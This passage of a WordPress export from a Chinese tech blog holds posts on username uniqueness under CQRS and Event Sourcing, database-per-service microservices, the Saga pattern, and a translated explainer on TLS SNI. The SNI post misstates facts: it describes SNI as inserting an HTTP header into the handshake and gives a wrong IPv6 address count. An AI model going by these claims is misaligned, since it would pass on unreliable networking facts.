handler，并且一个对应的领域对象被创建出来，随后一个<code>UserCreatedEvent</code>事件被保存到Event Store中。该事件需要通过事件总线来同步到<code>读数据库</code>。但此时事件总线中正在处理另一个用户名同样是<code>TestUser</code>的帐号创建事件，并且通过<code>读数据库</code>查询该用户名是不存在的，因此这个事件可以被最终同步到<code>读数据库</code>中去。然而后一个事件如果也被事件总线同步的话，就无法保证用户名的唯一性了，所以我们还需要再考虑一下其他方案。</p><h1>方案3：客户端验证</h1><p>这个方案是客户端验证。我们通过从客户端发起Http请求作为query去查询用户名是否已经存在，如果存在则可以给出提示给用户。如果不存在，则再发起一个创建用户的请求作为command来创建用户。这样看起来不错，但也存在缺陷。这仅仅是客户端验证，它也会因为最终一致性问题而失败，但我们可以大致遵循这个思路继续往下想。</p><h1>方案4：客户端验证+Saga模式</h1><p>你可能会想，客户端验证方案刚才不是说过也会偶尔失败吗？为什么还要继续用，因为这个失败率比较低，并且我们将会在服务端也做个保障措施。我们知道Event Store的数据存储结构并不适合做这样的唯一性验证，所以我们就需要使用<code>读数据库</code>。但是我们也知道由于CQRS原因我们不能在command中使用query去查询<code>读数据库</code>。所以我们接下来这么做，我们给<code>读数据库</code>增加一个用户名唯一性约束，这样的话当插入一个已经存在的用户名帐号时会抛出一个异常。很好，但这有另一个问题！在对<code>读数据库</code>插入已经存在的用户名帐号前，我们已经在Event Store中存储了对应的事件。所以我们应该删掉那个事件，因为查询时抛出了异常？但是，要记住请不要删除事件！我们不能去做删除事件这样的操作，因为Event Sourcing的思想就是要记录下所有对象状态变化的完整历史。我们所需要去做的应该是去创建一个<code>UserCreationCanceledEvent</code>事件，并且在我们聚合中增加一些逻辑以使得这种创建失败情况下不再重新构建出聚合对象。这看起来似乎很有道理，但我们需要去创建合适的事件。怎么建？这正是Saga派上用场的时候了。我们考虑一下这样的时间序列图：</p><p><img src="http://storage.veitor.net/2018/12/4201905302.png" alt="sq-diagram-1024x730.png" title="sq-diagram-1024x730.png"></p><p>这图可能看起来较为复杂，实际上并不是。我们所需要理解的是Saga的职责。如果创建用户失败了，我们把这个创建用户事件传给Saga。随后，随后一个修正命令会被发往command bus去创建一个<code>UserCreationCanceledEvent</code>事件，然后该事件将被存储到Event Store中。就这些步骤就行了。</p><h1>结束</h1><p>我希望这篇文章能够帮到需要的人嗯。如果你有其他能保证用户名唯一性的好办法也可以在下面评论。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>577</wp:post_id>
		<wp:post_date><![CDATA[2018-12-04 08:11:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-04 08:11:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[577]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="cqrs"><![CDATA[CQRS]]></category>
		<category domain="post_tag" nicename="ddd"><![CDATA[ddd]]></category>
		<category domain="post_tag" nicename="event-sourcing"><![CDATA[Event Sourcing]]></category>
		<category domain="post_tag" nicename="event-store"><![CDATA[Event Store]]></category>
		<category domain="category" nicename="jiagou"><![CDATA[架构]]></category>
						</item>
					<item>
		<title>微服务模式：一个服务一个数据库</title>
		<link>http://wp.veitor.net/2018/12/05/580/</link>
		<pubDate>Wed, 05 Dec 2018 00:46:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=580</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;# 背景</p><p>我们假设你正在使用微服务架构来开发一个在线商城应用。大多数服务需要用某种数据库来持久化数据，如：订单服务存储关于订单的数据，客户服务存储客户相关的数据。</p><p><img src="http://storage.veitor.net/2018/12/2942027767.png" alt="customersandorders.png" title="customersandorders.png"></p><!--more--><h1>问题</h1><p>微服务中数据库架构是什么样的？</p><h1>限制</h1><ul><li>服务之间必须松耦合，以使得每个服务可以独立开发、部署和扩展</li><li>一些业务事务必须保障跨多个服务的业务不变量。比如，<code>下单</code>这个用例将会验证新订单是否会超过顾客的信用额度限制。其他业务事务必须通过多个服务更新数据。</li><li>一些业务事务需要能查询分布在多个服务中的数据。比如，<code>查看可用的信用额度</code>必须要先查询客户再去查询其信用额度来计算下单的总额。</li><li>一些查询必须要join分布在多个服务中的数据。比如，查询某个地区的客户和他们的最近订单需要join客户服务数据和订单服务数据。</li><li>数据库必须能被复制和分库来实现扩展。见<a href="https://microservices.io/articles/scalecube.html">伸缩立方(Scale Cube)</a></li><li>不同服务有不同数据存储要求。对于一些服务，关系数据库是一个好的选择。其他服务可能需要一个像MongoDB的NoSQL数据库，更适合存储复杂、无结构化的数据。</li></ul><h1>方案</h1><p>保持每个微服务的数据只对其服务访问，并且只能通过服务的API对外访问。一个服务的事务只涉及其对应的数据库。</p><p>下图展示了相关架构：</p><p><img src="http://storage.veitor.net/2018/12/2427239515.png" alt="databaseperservice.png" title="databaseperservice.png"></p><p>服务的数据库实际上是该服务实现的一部分，它不能被其它服务直接访问。</p><p>这有几种方式来保持服务的数据私有，你不需要为每个服务准备数据库。比如，如果你正在使用关系数据库，那么有这么几种选项：</p><ul><li>每个服务多个私有table：每个服务拥有一些只能被该服务访问的私有tables。</li><li>每个服务一个Schema：每个服务拥有一个只能被该服务访问的私有Schema。</li><li>每个服务一个Database：每个服务拥有一个Database Server。</li></ul><p>每个服务多个私有Table和每个服务一个Schema具有最低的开销，使用每个服务一个Schema更吸引人，因为这样会使得权限比较清晰。一些高吞吐量的服务可能需要他们自己的database server。</p><p>创建这种边界来使得模块化是一个好主意。这样以来你就可以为每个服务分配不同的数据库用户和数据库控制权限。如果没有这种边界，开发者将总会绕过服务的API来直接访问数据库获取数据。</p><h1>结果</h1><p>使用一个服务一个数据库有以下好处：</p><ul><li>确保服务之间松耦合，对一个服务数据库的更改不会影响到其他服务。</li><li>每个服务可以使用更适合的数据库类型。如做全文搜索的服务可以使用ElasticSearch。</li></ul><p>但也有以下缺点：</p><ul><li>实现跨多个服务的事务并不简单，由于CAP定理，最好避免分布式事务，而且许多流行数据库（如NoSQL）不支持分布式事务。最好的解决方案是使用Saga模式，当服务中的数据更新时发布一个事件，其他订阅了该事件的服务更新其数据来响应该事件。</li><li>实现在多个数据库join数据具有挑战性。</li><li>管理多个SQL和NoSQL数据库的复杂性。</li></ul><p>这也有几种方案：</p><ul><li>API组合：由应用程序实现join数据而不是数据库。假设一个服务要获取客户和他最近的订单，则先从客户服务获取该客户数据，再从订单服务查询获取该客户的最近订单信息。</li><li>命令查询职责分离(CQRS)：维护一个或多个来自其他服务的物化视图。服务订阅其他服务的事件，当其他服务发布事件时该服务再更新相关的物化视图。假设一个在线商城要实现查找特定区域的客户和他们最近的订单这个查询，只要通过维护一份join了客户信息和订单信息的物化视图就行了。该视图由该服务通过订阅客户服务和订单服务的事件来进行更新数据。</li></ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>580</wp:post_id>
		<wp:post_date><![CDATA[2018-12-05 00:46:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-05 00:46:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[580]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="cqrs"><![CDATA[CQRS]]></category>
		<category domain="post_tag" nicename="ddd"><![CDATA[ddd]]></category>
		<category domain="post_tag" nicename="%e5%be%ae%e6%9c%8d%e5%8a%a1"><![CDATA[微服务]]></category>
		<category domain="category" nicename="jiagou"><![CDATA[架构]]></category>
						</item>
					<item>
		<title>微服务模式：Saga</title>
		<link>http://wp.veitor.net/2018/12/05/584/</link>
		<pubDate>Wed, 05 Dec 2018 01:46:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=584</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;# 背景</p><p>你已经应用了<a href="http://www.veitor.net/article/580.html">一个服务一个数据库</a>的模式，每个服务都有自己的数据库。但是一些事务需要跨服务，因此你需要一种机制来保证跨服务的数据一致性。假设你正在建设一个电子商城，客户有其信用额度。应用必须确保新订单不会超过该客户的可用额度限制。因为订单和客户信息在不同的数据库中，因此应用不能简单的使用ACID事务。</p><!--more--><h1>问题</h1><p>如何处理跨服务的数据一致性问题？</p><h1>限制</h1><ul><li>2PC不能用</li></ul><h1>方案</h1><p>将跨服务的事务实现为Saga。在Saga中每个本地事务更新数据库后并发布一个事件来触发下一个本地事务。如果一个本地事务因不符合业务规则而失败，则Saga将执行一系列修正事务，来撤销之前本地事务的修改。</p><p><img src="http://storage.veitor.net/2018/12/3652855247.jpg" alt="saga.jpg" title="saga.jpg"></p><p>实现Saga的两种方式：</p><ul><li>编排（Choreography）：每个本地事务发送领域事件来触发其他服务中的本地事务。</li><li>编制（Orchestration）：一个编制器（对象）告诉参与者该执行什么本地事务。</li></ul><h1>示例：基于编排的Saga模式</h1><p><img src="http://storage.veitor.net/2018/12/2143801791.jpeg" alt="Saga_Choreography_Flow.001.jpeg" title="Saga_Choreography_Flow.001.jpeg"></p><p>使用基于编排Saga的电商程序在创建订单时包含以下步骤：</p><ol><li><code>订单服务</code>创建一个待确认状态的订单并且发布一个<code>OrderCreated</code>事件；</li><li><code>客户服务</code>接收到了该事件，并尝试去为该订单查询信用。它将发布一个<code>CreditReserved</code>事件或者<code>CreditLimitExcedded</code>事件。</li><li><code>订单服务</code>接收到事件后将改变订单状态为通过或取消。</li></ol><h1>示例：基于编制的Saga模式</h1><p><img src="http://storage.veitor.net/2018/12/951589825.jpeg" alt="Saga_Orchestration_Flow.001.jpeg" title="Saga_Orchestration_Flow.001.jpeg"></p><p>使用基于编制Saga的电商程序在创建订单时包含以下步骤：</p><ol><li><code>订单服务</code>创建一个待确认状态的订单，同时创建了一个<code>CreateOrderSaga</code>；</li><li><code>CreateOrderSaga</code>发送一个<code>ReserveCredit</code>命令到客户服务；</li><li><code>客户服务</code>尝试为该订单查询信用并发送回复。</li><li><code>CreateOrderSaga</code>接受到回复后发送<code>ApproveOrder</code>或<code>RejectOrder</code>命令到订单服务；</li><li><code>订单服务</code>将订单状态修改为通过或取消。</li></ol><blockquote><p>基于编制的Saga又被称为<code>流程管理器(Process Manager)</code>，因为一个聚合状态的整个流程变化都由Saga来控制。如上步骤示例，可以看出Saga会对前一步骤创建出来的Event作出响应，所以基于编制的Saga流程管理又类似于Event Dispatcher，会分发和处理相应的领域事件。</p></blockquote><h1>结果</h1><p>这模式有以下好处：</p><ul><li>它能让应用不使用分布式事务而实现跨服务的数据一致性。</li></ul><p>但也有以下缺点：</p><ul><li>编程模型会变得更复杂。开发者必须要设计修正事务来明确撤销之前在saga中做的改动。</li></ul><p>还有以下问题需要去解决：</p><ul><li>为了可靠性，一个服务必须以原子方式更新数据库和发布事件。它不能使用跨数据库和消息broker的分布式事务这种传统方式，相反，它必须使用下列模式中的一种。</li></ul><h1>相关模式</h1><ul><li>一个服务一个数据库</li><li><p>以下模式是以原子更新状态和发布事件消息的：</p><ul><li>事件溯源（Event Sourcing）</li><li>应用事件（Application Event）</li></ul></li><li>一个基于编排的saga能使用聚合和领域事件发布事件。</li></ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>584</wp:post_id>
		<wp:post_date><![CDATA[2018-12-05 01:46:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-05 01:46:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[584]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="cqrs"><![CDATA[CQRS]]></category>
		<category domain="post_tag" nicename="event-sourcing"><![CDATA[Event Sourcing]]></category>
		<category domain="post_tag" nicename="%e5%be%ae%e6%9c%8d%e5%8a%a1"><![CDATA[微服务]]></category>
		<category domain="category" nicename="jiagou"><![CDATA[架构]]></category>
						</item>
					<item>
		<title>什么是SNI？</title>
		<link>http://wp.veitor.net/2019/05/06/593/</link>
		<pubDate>Mon, 06 May 2019 13:41:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=593</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;# SNI：在同一个IP地址上运行多个SSL证书</p><p>什么是Server Name Indication(SNI)？SNI是SSL的重要组成部分，它允许多个网站存在同一个IP地址上，如果没有SNI，每个域名都需要有自己的一个IP才能安装SSL证书。然而，SNI解决了这个问题。</p><h1>为什么指定 Host 名称的方法无法再适用于 SSL 协议</h1><p>大概在 2007 年以前，人们通过在 Header 里指明 Host 名称来解决这种同一 IP 上有多个网站的问题。</p><p>当客户端请求指定的网站时，在 HTTP Header 上指明要去的 Host 名称，然后服务端就会匹配 header 指定的网站，然后将请求发到那里去。</p><p>然而当 HTTPS 开始使用后，这一招不管用了。</p><p>因为 SSL 在客户端和服务端建立一个加密连接前，需要进行一次 SSL 握手。包含在 HTTP Header 里的域名只有在握手成功后才能被拿到，因此服务端无法知道该去连接同一 IP 上的哪个服务器。</p><h1>SNI 是什么</h1><p>SNI（服务名称证明)是一个 SSL/TLS 协议的拓展，它允许在一个 IP 上有多个 SSL 证书。</p><p>SNI 是通过在 SSL 握手时插入 HTTP Header 实现这个功能的。因为服务端可以在握手时读到想要连接的 Host 名称，就可以连接到正确的网站。</p><p><img src="http://storage.veitor.net/2019/05/167870958.png" alt="handshake-diagram-thumb-500xauto-5789.png" title="handshake-diagram-thumb-500xauto-5789.png"></p><!--more--><p>在 SNI 创造之前，每个你想加密的网站都必须有一个唯一的 IP 地址。你可能意识不到的是，这多么的浪费，甚至对 IPv4 IP 地址的消耗产生了非常严重的影响。</p><p>我们都知道 IPv4 定义的 IP 地址是有限的，它赋予使用 IP 协议进行通讯的电脑网络中的每一个设备一个地址。</p><p>一个 IPv4 的地址格式如下：</p><p><img src="http://storage.veitor.net/2019/05/1178067102.png" alt="ipv4-100629207-orig.png" title="ipv4-100629207-orig.png"></p><p>世界上大概有 40 亿个 IPv4 地址，迟早有一天这 40 亿个地址将都用完。但有了 SNI 以后，这个过程会慢很多，每个 IP 可以有多个服务器地址了。</p><p>最终所有的互联网将都使用 IPv 地址，这个版本下大概有 340 * 11^60 个地址，这个数字很大，大概可以够我们用很久了。</p><h1>SNI 的未来会怎样？</h1><p>SNI 最让人担心是它的可扩展性。起初，一些人认为 Web 浏览器和服务器得好久以后才会使用 SNI。</p><p>事实证明，这种担忧在很大程度上是毫无根据的。今天，根据 Akamai 统计，几乎 98% 的客户要求启用 HTTPS 的站点支持 SNI。</p><h1>总结一下</h1><p>这篇文章讨论了这些点：</p><ul><li>什么是 SNI：Server Name Indication （服务端名称证明）允许在同一个 IP 地址上存在多个 SSL 证书</li><li>SNI 在 SSL 握手中插入 HTTP Header 从而让服务端觉得连接哪个网站</li><li>到 20171117 日为止，百分之 98 的用户要求 HTTPS 支持 SNI</li></ul><blockquote><p>翻译自<a href="https://www.thesslstore.com/blog/what-is-sni/">https://www.thesslstore.com/blog/what-is-sni/</a></p></blockquote>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>593</wp:post_id>
		<wp:post_date><![CDATA[2019-05-06 13:41:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-05-06 13:41:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[593]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="post_tag" nicename="%e8%bf%90%e7%bb%b4"><![CDATA[运维]]></category>
						</item>
				</channel>
</rss>
	